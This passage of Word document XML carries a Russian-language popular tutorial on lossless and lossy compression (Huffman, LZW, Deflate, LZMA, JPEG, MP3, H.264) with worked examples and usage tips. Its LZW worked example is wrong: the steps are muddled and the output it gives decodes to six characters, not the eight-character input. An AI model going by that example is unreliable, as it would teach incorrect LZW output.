        <w:t>C: `1110`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D: `1111`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Закодированная строка:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>A  B  R  A  C  A  D  A  B  R  A</w:t>
        <w:br/>
        <w:t>0  10 110 0 1110 0 1111 0 10 110 0</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Итого: `0101100111001111010110­0` = 23 бита = 2.875 байта</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Исходная строка в ASCII (8 бит на символ): 11 × 8 = 88 бит = 11 байт</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Степень сжатия: 11 / 2.875 ≈ 3.8</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Где используется</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>ZIP, GZIP, RAR (как часть более сложных алгоритмов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>JPEG (для кодирования коэффициентов DCT)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>MP3, AAC (тоже как часть)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минус</w:t>
      </w:r>
      <w:r>
        <w:t>: Нужно хранить таблицу кодов вместе с данными, что добавляет накладные расходы. Для маленьких файлов может быть невыгодно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>LZW (Lempel-Ziv-Welch) — для умных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>LZW</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — алгоритм, который строит словарь повторяющихся последовательностей символов прямо в процессе сжатия. Не нужно заранее знать, что будет повторяться.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Начинаем со словаря одиночных символов (A=1, B=2, C=3...). При встрече новой комбинации добавляем её в словарь и используем дальше.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 4</w:t>
      </w:r>
      <w:r>
        <w:t>: Сжать строку "ABABABAB"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Шаг 1: Читаем "A" → код 65 (ASCII), словарь: {}</w:t>
        <w:br/>
        <w:t>Шаг 2: Читаем "B" → код 66, словарь: {AB: 256}</w:t>
        <w:br/>
        <w:t>Шаг 3: Читаем "AB" → код 256 (уже в словаре!), словарь: {AB: 256, ABA: 257}</w:t>
        <w:br/>
        <w:t>Шаг 4: Читаем "AB" → код 256, словарь: {AB: 256, ABA: 257, ABAB: 258}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Результат: `65 66 256 256` (4 числа вместо 8 символов)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Где используется</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>GIF (графический формат)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>TIFF (с опцией LZW)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Старые модемы (V.42bis)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Unix-утилита `compress`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минус</w:t>
      </w:r>
      <w:r>
        <w:t>: Словарь может стать огромным, нужно ограничивать его размер или периодически сбрасывать.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Deflate (LZ77 + Huffman) — царь архиваторов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Deflate</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — комбинация алгоритма LZ77 (поиск повторяющихся последовательностей) и кодирования Хаффмана. Это основа для ZIP, GZIP, PNG.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает LZ77</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Ищет повторяющиеся последовательности и заменяет их ссылками типа "повтори 5 символов, которые были 12 позиций назад".</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 5</w:t>
      </w:r>
      <w:r>
        <w:t>: Сжать строку "blablablabla"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>b l a b l a b l a b l a</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>После "bla" встречается повтор:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>bla → буквально</w:t>
        <w:br/>
        <w:t>bla → ссылка (назад 3, длина 3)</w:t>
        <w:br/>
        <w:t>bla → ссылка (назад 3, длина 3)</w:t>
        <w:br/>
        <w:t>bla → ссылка (назад 3, длина 3)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Вместо 12 символов: `bla` + 3 ссылки (каждая ~2 байта) = 3 + 6 = 9 байт (условно)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Где используется</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**ZIP** — архиватор по умолчанию</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**GZIP** — сжатие в HTTP (когда качаешь сайты)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**PNG** — сжатие графики без потерь</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**ZLIB** — библиотека сжатия</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы</w:t>
      </w:r>
      <w:r>
        <w:t>: Быстро, хорошая степень сжатия, широко поддерживается.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>LZMA (Lempel-Ziv-Markov chain Algorithm) — монстр сжатия</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>LZMA</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — очень мощный алгоритм, используется в 7-Zip. Сжимает лучше Deflate, но медленнее.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 6</w:t>
      </w:r>
      <w:r>
        <w:t>: Сравнение сжатия одного файла (10 МБ текста)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Алгоритм | Размер сжатого | Время сжатия | Степень сжатия |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|----------|----------------|--------------|----------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| ZIP (Deflate) | 3.2 МБ | 2 сек | 3.1 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 7-Zip (LZMA) | 2.1 МБ | 8 сек | 4.8 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| RAR | 2.4 МБ | 5 сек | 4.2 |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Где используется</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**7-Zip (.7z)** — популярный архиватор</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**XZ** — сжатие в Linux (архивы .tar.xz)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минус</w:t>
      </w:r>
      <w:r>
        <w:t>: Жрёт память и время. Для быстрого сжатия лучше ZIP.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Алгоритмы сжатия с потерями</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>А теперь перейдём к тёмной стороне — форматам, которые выкидывают "ненужное". Спойлер: ненужное решают они, а не ты.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>JPEG — когда пиксели не важны</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>JPEG (Joint Photographic Experts Group)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — стандарт сжатия фотографий. Выкидывает мелкие детали, которые глаз не заметит (ну, в теории).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Делит изображение на блоки 8×8 пикселей</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Применяет дискретное косинусное преобразование (DCT)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Квантует высокочастотные компоненты (= выкидывает детали)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Сжимает получившиеся данные алгоритмом Хаффмана</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 7</w:t>
      </w:r>
      <w:r>
        <w:t>: Фотография 4000×3000 пикселей, 24 бита на пиксель (RGB)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Размер без сжатия:</w:t>
        <w:br/>
        <w:t>4000 × 3000 × 3 байта = 36 000 000 байт = 34.3 МБ</w:t>
        <w:br/>
        <w:br/>
        <w:t>Размер JPEG (качество 90%):</w:t>
        <w:br/>
        <w:t>~ 2.5 МБ</w:t>
        <w:br/>
        <w:br/>
        <w:t>Степень сжатия: 34.3 / 2.5 ≈ 13.7</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Где используется</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Фотографии в интернете</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Цифровые камеры (по умолчанию)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Почти везде, где есть картинки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>При каждом пересохранении качество падает (привет, мемы 2010 года с 5 пикселями)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Плохо сжимает текст и чёткие линии (появляются артефакты)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Не поддерживает прозрачность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Правило</w:t>
      </w:r>
      <w:r>
        <w:t>: Используй JPEG для фото, PNG для скриншотов и графики.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>MP3, AAC, Opus — когда уши не услышат</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>MP3 (MPEG-1 Audio Layer 3)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — легендарный формат сжатия звука. Выкидывает частоты, которые человек якобы не слышит.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Разбивает звук на частоты (преобразование Фурье)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Применяет психоакустическую модель (определяет, что можно выкинуть)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Квантует и кодирует оставшееся</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 8</w:t>
      </w:r>
      <w:r>
        <w:t>: Песня 3 минуты, стерео, 44.1 кГц, 16 бит</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Размер WAV (без сжатия):</w:t>
        <w:br/>
        <w:t>3 минуты × 60 сек × 44100 Гц × 2 канала × 2 байта = 31 752 000 байт ≈ 30.3 МБ</w:t>
        <w:br/>
        <w:br/>
        <w:t>Размер MP3 (320 кбит/с):</w:t>
        <w:br/>
        <w:t>320 кбит/с × 180 сек / 8 = 7 200 000 байт ≈ 6.9 МБ</w:t>
        <w:br/>
        <w:br/>
        <w:t>Степень сжатия: 30.3 / 6.9 ≈ 4.4</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Современные альтернативы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**AAC** (используется в Apple Music, YouTube) — лучше MP3 при тех же битрейтах</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Opus** (используется в Discord, WhatsApp) — лучше всех для голоса и музыки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минус</w:t>
      </w:r>
      <w:r>
        <w:t>: Аудиофилы будут плакать и говорить про "потерю тёплого лампового звука". Обычный человек не услышит разницы при 256+ кбит/с.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>H.264, H.265 (HEVC) — сжатие видео</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>H.264 (AVC)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — стандарт сжатия видео. Используется в YouTube, Netflix, Blu-ray.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Делит кадры на типы: I-кадры (ключевые, сжаты как JPEG), P-кадры (предсказание от предыдущего), B-кадры (предсказание от прошлого и будущего)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Сохраняет только изменения между кадрами</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Применяет внутрикадровое сжатие (похоже на JPEG)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 9</w:t>
      </w:r>
      <w:r>
        <w:t>: Видео FullHD (1920×1080), 60 FPS, 10 минут</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Размер без сжатия:</w:t>
        <w:br/>
        <w:t>1920 × 1080 × 3 байта × 60 FPS × 600 сек = 373 248 000 000 байт ≈ 347 ГБ (!)</w:t>
        <w:br/>
        <w:br/>
        <w:t>Размер H.264 (битрейт 8 Мбит/с):</w:t>
        <w:br/>
        <w:t>8 Мбит/с × 600 сек / 8 = 600 000 000 байт ≈ 572 МБ</w:t>
        <w:br/>
        <w:br/>
        <w:t>Степень сжатия: 347000 / 572 ≈ 606</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Да, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>в 600 раз</w:t>
      </w:r>
      <w:r>
        <w:t>. Вот почему ты можешь смотреть видео онлайн.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>H.265 (HEVC)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — новый стандарт, сжимает в 2 раза лучше H.264, но требует больше ресурсов для декодирования.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Где используется</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>YouTube, Twitch, Netflix</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Blu-ray диски</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Все видеозвонки (Zoom, Skype)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Сравнение алгоритмов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Таблица: Когда что использовать</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Тип данных | Без потерь | С потерями |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|------------|------------|------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| Текст, код, документы | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ZIP, 7-Zip, GZIP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Нельзя |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| Фотографии | PNG, WebP (lossless) | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>JPEG, WebP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| Скриншоты, графика | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>PNG</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | JPEG (плохо) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| Музыка | FLAC, ALAC | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>MP3, AAC, Opus</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| Видео | Huffyuv, FFV1 (редко) | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>H.264, H.265, VP9, AV1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Базы данных | ZIP, LZMA | Нельзя |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Практические советы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Для хранения важных данных** (документы, код, базы данных) — только без потерь (ZIP, 7-Zip).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Для фотографий** — JPEG при экспорте, RAW или TIFF при обработке.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Для скриншотов** — PNG, НИКОГДА не JPEG (будет мыло).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Для музыки** — FLAC если место есть, AAC/Opus если жалко диск.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Для видео** — H.264 для совместимости, H.265 если устройство поддерживает, AV1 для будущего.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Не пересохраняй lossy форматы** — каждое пересохранение теряет качество. Храни оригиналы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Парадоксы и приколы сжатия</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Парадокс: можно ли сжать всё до 1 байта?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Нет.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Это доказывается теорией информации (привет, Клод Шеннон из главы 1.5).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Доказательство для чайников</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Допустим, мы можем любой файл сжать до 1 байта. Байт — это 256 вариантов (0-255). Значит, существует максимум 256 различных сжатых файлов. Но несжатых файлов бесконечно много. Значит, несколько разных файлов должны сжаться в один и тот же код. А как их потом различить при распаковке? Никак. Парадокс.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t>: Идеального алгоритма сжатия не существует. Любой алгоритм хорошо работает только для определённого типа данных.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Сжатие случайных данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Попробуй сжать случайный шум или уже сжатый файл — получишь файл </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>большего размера</w:t>
      </w:r>
      <w:r>
